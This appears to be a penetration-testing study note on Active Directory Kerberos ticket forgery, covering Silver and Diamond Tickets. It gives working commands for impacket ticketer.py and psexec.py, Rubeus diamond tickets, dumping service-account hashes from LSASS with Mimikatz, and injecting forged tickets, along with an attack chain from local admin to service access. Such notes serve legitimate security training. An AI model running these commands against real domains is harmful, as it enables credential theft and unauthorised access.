**Silver Ticket** forges a service ticket using a _service account's_ hash (not krbtgt) — narrower access (one service only) but never touches the DC, so it's stealthier. **Diamond Ticket** takes a _real_ TGT and modifies its PAC in place rather than forging one from scratch, which evades detections that look for "ticket with no matching AS-REQ".

```
# Silver Ticket (needs the target service account's NTLM hash):
ticketer.py -nthash <SERVICE_ACCT_NTLM> -domain-sid S-1-5-21-XXX-XXX-XXX \
    -domain corp.local -spn cifs/target.corp.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@target.corp.local

# Diamond Ticket (Rubeus, needs krbtgt hash + a real TGT to modify):
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
    /groups:512 /krbkey:<KRBTGT_AES256> /domain:corp.local /dc:DC01.corp.local /ptt
```

## Silver Ticket — Chapter 22 checklist

To forge a Silver Ticket, collect:

```text
1. SPN / service-account password hash
2. Domain SID
3. Target SPN
```

Why it works: the target service normally trusts the authorization/group information in a correctly encrypted service ticket. PAC validation against the DC is optional and is not performed by many service applications.

### Get service-account hash from LSASS

If the SPN account has a session on a host where you are local Administrator/SYSTEM:

```text
privilege::debug
sekurlsa::logonpasswords
```

Then obtain the Domain SID, for example:

```powershell
whoami /user
```

Remove the final RID from the user SID to get the Domain SID.

### Mimikatz Silver Ticket

```text
kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /ptt \
  /target:<TARGET_FQDN> /service:<SERVICE> \
  /rc4:<SERVICE_ACCOUNT_NTLM> /user:<EXISTING_DOMAIN_USER>
```

`/ptt` injects the forged ticket into the current logon session.

Confirm:

```powershell
klist
```

> [!important]
> **Silver Ticket does not require DCSync.** Any route that gives you the relevant SPN/service-account hash can be enough.

```text
local admin / SYSTEM on host
    ↓
service account has session
    ↓
dump service-account NTLM from LSASS
    ↓
Silver Ticket
    ↓
access target SPN/service
```

See [[Active Directory/AD Authentication — NTLM, Kerberos & LSASS|AD Authentication]] and [[Active Directory/Win-MS01|Win-MS01]].
